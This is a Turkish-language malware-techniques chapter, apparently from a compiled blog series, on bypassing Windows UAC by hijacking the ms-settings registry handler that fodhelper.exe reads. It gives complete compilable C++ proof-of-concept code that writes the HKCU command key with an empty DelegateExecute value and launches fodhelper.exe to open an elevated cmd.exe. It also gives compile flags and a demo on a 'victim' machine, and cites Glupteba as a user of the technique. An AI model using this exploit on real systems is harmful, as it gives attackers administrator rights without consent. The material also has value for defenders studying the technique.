\newpage
\subsection{66. kötü amaçlı yazılım AV/VM atlatma - bölüm 13 (yazıda bölüm 17): fodhelper.exe Üzerinden UAC atlatma. Basit C++ örneği.}

﷽

![av-evasion](./images/101/2023-06-20_23-11.png){width="80%"}      

Bu gönderi, antivirüsü tarama hakkından mahrum bırakarak atlatmayı amaçladığım araştırma projelerimden birinin ara sonucu olarak ortaya çıktı. Bu nedenle, kendi araştırmamın ilk adımının sonucu olup, ilginç UAC bypass tekniklerinden biri olan `fodhelper.exe` üzerinden kayıt defteri (registry) değişikliği ile atlatma yöntemini ele almaktadır.      

### kayıt defteri (Registry) değişikliği

Bir kayıt defteri anahtarını değiştirme süreci, yükseltilmiş bir programın yürütme akışını yönetilen bir komuta yönlendirme amacına sahiptir. Anahtar değerlerinin en yaygın kötüye kullanımları, `windir` ve `systemroot` ortam değişkenlerinin manipüle edilmesi ve belirli dosya uzantıları için shell open komutlarının değiştirilmesini içerir. (Hedeflenen programa bağlı olarak değişebilir.):

- `HKCU\\Software\\Classes\<targeted_extension>\\shell\\open\command (Default or DelegateExecute values)`     
- `HKCU\\Environment\\windir`     
- `HKCU\\Environment\\systemroot`        

### fodhelper.exe

`fodhelper.exe`, Windows 10'da bölgeye özel klavye ayarları gibi isteğe bağlı özellikleri yönetmek için tanıtılmıştır. Bulunduğu konum: `C:\Windows\System32\fodhelper.exe` ve Microsoft tarafından imzalanmıştır:     

![av-evasion](./images/101/2023-06-20_23-50.png){width="80%"}      

`fodhelper.exe` çalıştırıldığında, process monitor işlemi yakalamaya başlar ve (diğer şeylerin yanı sıra) tüm kayıt defteri ve dosya sistemi okuma/yazma işlemlerini gösterir. Kayıt defterinin okuma erişimleri, belirli anahtarlar veya değerler keşfedilmese de, en ilgi çekici aktivitelerden biridir. Özel izinlere gerek olmadan girişleri değiştirebildiğimiz için, `HKEY_CURRENT_USER` (HKCU) kayıt defteri anahtarları, bir programın davranışının yeni bir kayıt defteri anahtarı oluşturulduğunda nasıl değişebileceğini test etmek açısından özellikle kullanışlıdır.     

`fodhelper.exe`, `HKCU:\Software\Classes\ms-settings\shell\open\command` anahtarını arar. Bu anahtar, Windows 10'da varsayılan olarak mevcut değildir:     

![av-evasion](./images/101/2023-06-20_23-58.png){width="80%"}      

Bu yüzden, malware, `fodhelper.exe`'yi çalıştırdığında (bildiğimiz gibi, UAC istemi gerektirmeden yükseltilmeye izin veren bir Windows binary'si), Windows `fodhelper.exe`'yi Medium (orta) bütünlük seviyesinden High (yüksek) bütünlük seviyesine otomatik olarak yükseltir. Yüksek bütünlük seviyesindeki `fodhelper.exe`, bir `ms-settings` dosyasını varsayılan işleyicisiyle açmaya çalışır. Ancak, orta bütünlük (`medium integrity`) seviyesindeki malware bu işleyiciyi ele geçirdiğinden, yükseltilmiş `fodhelper.exe`, kötü amaçlı bir komutu yüksek bütünlük seviyesinde çalıştırır.    

### pratik örneği

Şimdi, bu mantık için PoC oluşturalım. Öncelikle, kayıt defteri anahtarını oluşturup değerleri ayarlayalım - kayıt defteri değişiklik adımımız:      

```cpp
HKEY hkey;
DWORD d;

const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
const char* cmd = "cmd /c start C:\\Windows\\System32\\cmd.exe"; // default program
const char* del = "";

// attempt to open the key
LSTATUS stat = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)settings, 0, NULL, 0, 
KEY_WRITE, NULL, &hkey, &d);
printf(stat != ERROR_SUCCESS ? "failed to open or create reg key\n" : 
"successfully create reg key\n");

// set the registry values
stat = RegSetValueEx(hkey, "", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));
printf(stat != ERROR_SUCCESS ? "failed to set reg value\n" : 
"successfully set reg value\n");

stat = RegSetValueEx(hkey, "DelegateExecute", 0, REG_SZ, (unsigned char*)del, 
strlen(del));
printf(stat != ERROR_SUCCESS ? "failed to set reg value: DelegateExecute\n" : 
"successfully set reg value: DelegateExecute\n");

// close the key handle
RegCloseKey(hkey);
```

Üstte açıklandığı gibi, `HKCU:\Software\Classes\ms-settings\` altında yeni bir kayıt defteri yapısı oluşturularak UAC atlatması gerçekleştirilmektedir.    

Daha sonra, yükseltilmiş uygulamayı başlatın:    

```cpp
 // start the fodhelper.exe program
SHELLEXECUTEINFO sei = { sizeof(sei) };
sei.lpVerb = "runas";
sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
sei.hwnd = NULL;
sei.nShow = SW_NORMAL;

if (!ShellExecuteEx(&sei)) {
  DWORD err = GetLastError();
  printf (err == ERROR_CANCELLED ? "the user refused to allow privileges elevation.\n" : "unexpected error! error code: %ld\n", err);
} else {
  printf("successfully create process =^..^=\n");
}

return 0;
```

Hepsi bu kadar.    

Tam kaynak kodu `hack.c` dosyasında şu şekilde görünmektedir:        

```cpp
/*
 * hack.c - bypass UAC via fodhelper.exe
 * (registry modifications). C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2023/06/19/malware-av-evasion-17.html
*/
#include <windows.h>
#include <stdio.h>

int main() {
  HKEY hkey;
  DWORD d;

  const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
  const char* cmd = "cmd /c start C:\\Windows\\System32\\cmd.exe"; 
  // default program
  const char* del = "";

  // attempt to open the key
  LSTATUS stat = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)settings, 0, NULL, 
  0, KEY_WRITE, NULL, &hkey, &d);
  printf(stat != ERROR_SUCCESS ? "failed to open or create reg key\n" : 
  "successfully create reg key\n");

  // set the registry values
  stat = RegSetValueEx(hkey, "", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));
  printf(stat != ERROR_SUCCESS ? "failed to set reg value\n" : 
  "successfully set reg value\n");

  stat = RegSetValueEx(hkey, "DelegateExecute", 0, REG_SZ, (unsigned char*)
  del, strlen(del));
  printf(stat != ERROR_SUCCESS ? "failed to set reg value: DelegateExecute\n" 
  : "successfully set reg value: DelegateExecute\n");

  // close the key handle
  RegCloseKey(hkey);

  // start the fodhelper.exe program
  SHELLEXECUTEINFO sei = { sizeof(sei) };
  sei.lpVerb = "runas";
  sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
  sei.hwnd = NULL;
  sei.nShow = SW_NORMAL;

  if (!ShellExecuteEx(&sei)) {
    DWORD err = GetLastError();
    printf (err == ERROR_CANCELLED ? "the user refused to allow privileges 
    elevation.\n" : 
    "unexpected error! error code: %ld\n", err);
  } else {
    printf("successfully create process =^..^=\n");
  }

  return 0;
}
```

### demo

Hadi her şeyi çalışırken görelim. Öncelikle, kayıt defterini kontrol edelim:       

```powershell
reg query "HKCU\Software\Classes\ms-settings\Shell\open\command"
```

![av-evasion](./images/101/2023-06-20_23-08_1.png){width="80%"}      

Ayrıca, mevcut ayrıcalıklarımızı kontrol edelim:    

```powershell
whoami /priv
```

![av-evasion](./images/101/2023-06-20_23-09_2.png){width="80%"}      

Saldırganın makinesinde `hack.c` PoC dosyamızı derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![av-evasion](./images/101/2023-06-20_23-16.png){width="80%"}      

Daha sonra, sadece kurbanın makinesinde çalıştırın (benim durumumda `Windows 10 x64 1903`):      

```powershell
.\hack.exe
```

![av-evasion](./images/101/2023-06-20_23-08.png){width="80%"}      

Gördüğünüz gibi, `cmd.exe` başlatıldı. Kayıt defteri yapısını tekrar kontrol edin:    

```powershell
reg query "HKCU\Software\Classes\ms-settings\Shell\open\command"
```

![av-evasion](./images/101/2023-06-20_23-09.png){width="80%"}      

Gördüğünüz gibi, kayıt defteri başarıyla değiştirildi.     

Başlatılan `cmd.exe` oturumundaki ayrıcalıkları kontrol edin:    

```powershell
whoami /priv
```

![av-evasion](./images/101/2023-06-20_23-09_1.png){width="80%"}      

Ardından, `Process Hacker`'ı Yönetici (Administrator) ayrıcalıklarıyla çalıştırın:     

![av-evasion](./images/101/2023-06-20_23-12.png){width="80%"}      

Ve `cmd.exe`'nin özelliklerini kontrol edin.        

![av-evasion](./images/101/2023-06-20_23-14.png){width="80%"}      

![av-evasion](./images/101/2023-06-20_23-15.png){width="80%"}      

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=     

[Glupteba](https://malpedia.caad.fkie.fraunhofer.de/details/win.glupteba) zararlı yazılımı, bu yöntemi kullanarak önce Medium'dan High (yüksek) bütünlük seviyesine yükseliyor, ardından Token Manipulation yöntemiyle High seviyesinden System bütünlüğüne geçiyor.    

Umarım bu gönderi, mavi takım üyelerine bu ilginç bypass tekniği hakkında farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine yeni bir silah ekler.     

[MITRE ATT&CK: Modify registry](https://attack.mitre.org/techniques/T1112/)    
[Glupteba](https://malpedia.caad.fkie.fraunhofer.de/details/win.glupteba)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-06-19-malware-av-evasion-17)       
